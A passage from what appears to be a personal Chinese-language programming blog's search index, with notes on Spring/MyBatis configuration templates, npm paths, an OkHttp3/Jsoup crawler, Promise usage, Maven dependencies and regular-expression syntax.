class="attr">transaction-manager</span>=<span class="string">&quot;transactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--配置哪些方法使用什么样的事务,配置事务的传播特性--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;addUser&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;deleteUser&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;selectUserList&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--2、AOP配置--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;txPointCut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.lry.mapper.UserMapperImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;txPointCut&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Mybatis-Spring</tag>
        <tag>事务</tag>
        <tag>配置模板</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis的Mapper的xml模板</title>
    <url>/2021/11/06/Mybatis%E7%9A%84Mapper%E7%9A%84xml%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="Mybatis的mapper-xml配置模板"><a href="#Mybatis的mapper-xml配置模板" class="headerlink" title="Mybatis的mapper.xml配置模板"></a>Mybatis的mapper.xml配置模板</h2><span id="more"></span>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>配置模板</tag>
        <tag>Mybatis</tag>
        <tag>Mapper.xml</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis的核心配置模板</title>
    <url>/2021/11/06/Mybatis%E7%9A%84%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="Mybatis的mybatis-config-xml配置模板"><a href="#Mybatis的mybatis-config-xml配置模板" class="headerlink" title="Mybatis的mybatis-config.xml配置模板"></a>Mybatis的mybatis-config.xml配置模板</h2><span id="more"></span>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;STDOUT_LOGGING&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>配置模板</tag>
        <tag>Mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title>Node和npm的配置</title>
    <url>/2022/04/24/Node%E5%92%8Cnpm%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="配置下载地址和命令、依赖引用路径"><a href="#配置下载地址和命令、依赖引用路径" class="headerlink" title="配置下载地址和命令、依赖引用路径"></a>配置下载地址和命令、依赖引用路径</h2><span id="more"></span>

<p>在这个过程中，要注意有三种路径：<strong>①安装路径   ②命令路径   ③依赖包路径</strong></p>
<p><strong>①安装路径：</strong>即npm安装工具的时候的安装路径，通过cmd中的命令设置</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> prefix &quot;D:\Develop\nodejs\node_global&quot;	//设置npm全局下载的位置</span><br><span class="line">npm config <span class="built_in">set</span> cache &quot;D:\Develop\nodejs\node_cache&quot;		//设置npm下载时的缓存的位置</span><br></pre></td></tr></table></figure>

<p><strong>②命令路径：</strong>即npm下载完工具后，在需要引用这些工具的某些命令的时候的路径；在环境变量中修改命令的路径（需要添加到Path中）</p>
<p><strong>③依赖包路径：</strong>在npm下载完工具后，除了第二种命令存在于一个地方，还会经相关的依赖包也单独放到一个node_module路径中；寻找这些依赖包，通过在环境变量中添加环境变量，命名为<strong>NODE_PATH（固定）</strong>，地址为node_global下的node_modules（不需要添加在Path中）</p>
<blockquote>
<p>①但是，如果是在项目中打开，则会自动从当前盘中逐层寻找依赖（即不需要通过添加环境变量）<br>②换一种说法，这个环境变量为了能够让在不同位置的项目使用同一个的依赖（即全局下载的）</p>
</blockquote>
<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p><strong>①“使用命令”：</strong>一般要能在终端中使用命令，则需要将命令所在的文件夹路径<strong>添加到环境变量Path中</strong><br><strong>②“引用依赖”：</strong>一般要使用一些文件夹下的依赖包，往往需要在环境变量中添加一些<strong>指定的变量名</strong>，地址为依赖包所在的文件夹（<strong>不需要添加到Path中</strong>）</p>
]]></content>
      <tags>
        <tag>本地命令使用</tag>
        <tag>本地依赖引用</tag>
      </tags>
  </entry>
  <entry>
    <title>OkHttp3爬虫+FastJson解析json+Jsoup解析Document节点+文本写入文件</title>
    <url>/2022/06/06/OkHttp3%E7%88%AC%E8%99%AB-FastJson%E8%A7%A3%E6%9E%90json-Jsoup%E8%A7%A3%E6%9E%90Document%E8%8A%82%E7%82%B9+%E6%96%87%E6%9C%AC%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="爬虫-JSON-Document-文件写入"><a href="#爬虫-JSON-Document-文件写入" class="headerlink" title="爬虫 + JSON + Document + 文件写入"></a>爬虫 + JSON + Document + 文件写入</h2><span id="more"></span>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String url = <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用okhttp3中的OKHttpClient请求，获取到Response（网络请求）</span></span><br><span class="line"><span class="comment">//注意①：Okhttp中的请求头不允许有中文，解决方法：将含有中文的请求头信息进行编码</span></span><br><span class="line"><span class="comment">//注意②：如果Cookie太长，直接通过复制值粘贴，则可能出现复制不全的情况，导致网络请求失败或者错误</span></span><br><span class="line">OkHttpClient httpClient = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">    .addHeader(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36&quot;</span>)</span><br><span class="line">    .url(url)</span><br><span class="line">    .build();</span><br><span class="line">Response response = httpClient.newCall(request).execute();</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用alibaba的fastjson进行字符串和JSON格式的转换（JSON格式）</span></span><br><span class="line"><span class="comment">//注意：如果请求到的是json格式，若不先转为json格式，再取相对应的xml内容，则字符串将会一直是Unicode编码（即看不到utf-8的中文）</span></span><br><span class="line">String responseString = response.body().string();</span><br><span class="line">System.out.println(responseString);</span><br><span class="line">JSONObject jsonObject = JSONObject.parseObject(responseString, JSONObject.class);</span><br><span class="line">JSONObject jsonObject1 = jsonObject.getJSONObject(<span class="string">&quot;html&quot;</span>);</span><br><span class="line">String html = jsonObject1.getString(<span class="string">&quot;list&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将获取到的内容（字符类型）写进文件中</span></span><br><span class="line">File file = <span class="keyword">new</span> File(<span class="string">&quot;C:\\Users\\用户名\\Desktop\\新建文本文档.txt&quot;</span>);</span><br><span class="line">FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">fileOutputStream.write(html.getBytes());</span><br><span class="line"><span class="comment">//关闭文件写入流</span></span><br><span class="line">fileOutputStream.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用Jsoup将字符串转为Document格式（XML格式），方便获取到指定的节点标签的内容</span></span><br><span class="line">Document document = Jsoup.parse(html);</span><br><span class="line">Elements imgs = document.getElementsByTag(<span class="string">&quot;h3&quot;</span>);</span><br><span class="line">Element element = imgs.get(<span class="number">0</span>);                  <span class="comment">//获取elements中第一个element元素</span></span><br><span class="line">System.out.println(element.text());             <span class="comment">//得到标签中的文本内容</span></span><br><span class="line">System.out.println(element.nodeName());         <span class="comment">//得到标签名</span></span><br><span class="line">System.out.println(element.tagName());          <span class="comment">//得到标签名</span></span><br><span class="line">element.tagName(<span class="string">&quot;lry&quot;</span>);     <span class="comment">//修改元素的标签名</span></span><br><span class="line">System.out.println(element.isBlock());          <span class="comment">//测试元素是否是块级元素</span></span><br><span class="line">System.out.println(element.parent());           <span class="comment">//得到父节点</span></span><br><span class="line">System.out.println(element.parents());          <span class="comment">//得到元素的父类和祖先节点直到文档的根。返回元素最接近的一个父类的堆栈</span></span><br><span class="line">System.out.println(element.children());         <span class="comment">//得到子元素集</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>爬虫</tag>
        <tag>Json解析</tag>
        <tag>Document解析</tag>
        <tag>写文件</tag>
      </tags>
  </entry>
  <entry>
    <title>Typora利用PicGo配置Gitee图床</title>
    <url>/2022/05/03/PicGo%E4%B8%AD%E7%9A%84Gitee%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="Gitee图床配置"><a href="#Gitee图床配置" class="headerlink" title="Gitee图床配置"></a>Gitee图床配置</h2><span id="more"></span>

<ol>
<li>添加插件<br><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503131215750.png" alt="image-20220503131215750"></li>
<li>图床配置<br><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503132101395.png" alt="image-20220503132101395"></li>
<li>点击“设置为默认图床”</li>
</ol>
<h2 id="Typora中的图像配置"><a href="#Typora中的图像配置" class="headerlink" title="Typora中的图像配置"></a>Typora中的图像配置</h2><p><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503132449416.png" alt="image-20220503132449416"></p>
]]></content>
      <tags>
        <tag>Typora图床配置</tag>
      </tags>
  </entry>
  <entry>
    <title>Promise在前端的作用</title>
    <url>/2021/10/21/Promise%E5%9C%A8%E5%89%8D%E7%AB%AF%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    <content><![CDATA[<h2 id="Promise的执行规则"><a href="#Promise的执行规则" class="headerlink" title="Promise的执行规则"></a>Promise的执行规则</h2><span id="more"></span>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;  </span><br><span class="line">                <span class="comment">//resolve(&quot;第一个参数&quot;);     </span></span><br><span class="line">                reject(<span class="string">&quot;第二个参数&quot;</span>);       </span><br><span class="line">            &#125;, <span class="number">2000</span>)</span><br><span class="line">        &#125;).then(<span class="function"><span class="params">val</span> =&gt;</span> &#123; </span><br><span class="line">    		<span class="built_in">console</span>.log(<span class="string">&quot;执行了resolve&quot;</span>)</span><br><span class="line">        &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;执行了reject&quot;</span>);</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>

<h3 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h3><p><strong>读懂代码如何执行，就懂了promise的使用了</strong></p>
<p><strong>一定要看懂它们！！！</strong></p>
<p><strong>一定要看懂它们！！！</strong></p>
<p><strong>一定要看懂它们！！！</strong></p>
<p>Promise的构造函数中，是一个函数（暂时本文私底下就叫它“小涵“吧），这个函数也需要两个参数（一般命名为resolve、reject），resolve和reject这两个参数也是函数。<strong>巧妙之处就在于：</strong>当Promise构造函数的参数”小涵“中执行了resolve（可传参）这个函数，就会执行Promise后面的then函数，同时resolve的实参，会传给then中形参；同理，如果执行了reject（可传参）函数，就会执行Promise后面的catch函数，同时reject的实参，会传给catch中的形参。</p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>根据上面分析的promise的特点，前端通常会用它辅助Axios网络请求一块使用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      axios(&#123;	<span class="comment">//在Promise的内部可以执行一个axios的一个网络请求，然后根据axios的执行结果，选择执行resolve和reject函数</span></span><br><span class="line">            url: url</span><br><span class="line">            method: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">            data: &#123;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">              resolve(res.data);	<span class="comment">//请求成功，执行resolve</span></span><br><span class="line">              <span class="comment">// console.log(res);</span></span><br><span class="line">          &#125;).catch(<span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">              reject(error);		<span class="comment">//请求失败，执行reject</span></span><br><span class="line">              <span class="comment">// console.log(error);</span></span><br><span class="line">          &#125;);</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    	<span class="built_in">console</span>.log(<span class="string">&quot;执行成功，请求结果为：&quot;</span> + data);</span><br><span class="line">	&#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    	<span class="built_in">console</span>.log(<span class="string">&quot;执行失败，失败信息为：&quot;</span> + err);</span><br><span class="line">	&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>在执行axios请求的时候，我们一般还会在Promise内部，在加一层setTimeOut（function（）{}，1000），将axios请求的代码，放到setTimeOut中去。</p>
]]></content>
      <tags>
        <tag>Promise的使用</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>SSM开发-依赖-资源导入</title>
    <url>/2021/11/06/SSM%E5%BC%80%E5%8F%91-%E4%BE%9D%E8%B5%96-%E8%B5%84%E6%BA%90%E5%AF%BC%E5%85%A5/</url>
    <content><![CDATA[<h2 id="SSM框架所需要的基本的依赖"><a href="#SSM框架所需要的基本的依赖" class="headerlink" title="SSM框架所需要的基本的依赖"></a>SSM框架所需要的基本的依赖</h2><span id="more"></span>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--使用mybatis框架--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--用于mysql连接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--用于spring框架--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--spring连接数据库--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--aop支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--整合spring和mybatis--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis-spring --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--用于测试--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="maven导入静态资源"><a href="#maven导入静态资源" class="headerlink" title="maven导入静态资源"></a>maven导入静态资源</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>配置模板</tag>
        <tag>SSM</tag>
        <tag>maven依赖包</tag>
        <tag>maven导入资源</tag>
      </tags>
  </entry>
  <entry>
    <title>Regular Expression</title>
    <url>/2023/01/18/Regular%20Expression/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><span id="more"></span>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">graph LR </span><br><span class="line">A(正则表达式)--&gt;B(语法)</span><br><span class="line">B--&gt;B1(普通字符)</span><br><span class="line">B--&gt;B2(非打印字符)</span><br><span class="line">B--&gt;B3(特殊字符)</span><br><span class="line">B--&gt;B4(限定符)</span><br><span class="line">B--&gt;B5(定位符)</span><br><span class="line">B--&gt;B6(选择)</span><br><span class="line">B--&gt;B7(反向引用)</span><br><span class="line">A--&gt;C(修饰符)</span><br><span class="line">A--&gt;D(元字符)</span><br><span class="line">A--&gt;E(运算符优先级)</span><br><span class="line">A--&gt;F(匹配规则)</span><br></pre></td></tr></table></figure>

<p><a href="https://imgse.com/i/pS3zuZV"><img src="https://s1.ax1x.com/2023/01/19/pS3zuZV.png" alt="pS3zuZV.png"></a></p>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h3><p>普通字符没有显示指定为元字符的所有<strong>可打印</strong>和<strong>不可打印</strong>字符（<strong>单个字符</strong>）。</p>
<p>包括大写和小写字母、所有数字、所有标点符号、一些其他符号。</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>[ABC]</strong></td>
<td>匹配[…]中的所有字符</td>
</tr>
<tr>
<td><strong>[^ABC]</strong></td>
<td>匹配除了[…]中的所有字符</td>
</tr>
<tr>
<td><strong>[A-Z]</strong></td>
<td>[A-Z] 表示一个区间，匹配所有大写字母，[a-z] 表示所有小写字母。</td>
</tr>
<tr>
<td><strong>.</strong></td>
<td>匹配除换行符（\n、\r）之外的任何单个字符，相等于[^\n\r]</td>
</tr>
<tr>
<td><strong>[\s\S]</strong></td>
<td>匹配所有。\s 是匹配所有空白符，包括换行，\S 非空白符，不包括换行。</td>
</tr>
<tr>
<td><strong>\w</strong></td>
<td>匹配字母、数字、下划线。等价于 [A-Za-z0-9_]</td>
</tr>
</tbody></table>
<h3 id="非打印字符"><a href="#非打印字符" class="headerlink" title="非打印字符"></a>非打印字符</h3><table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>\cx</strong></td>
<td>匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td>
</tr>
<tr>
<td><strong>\f</strong></td>
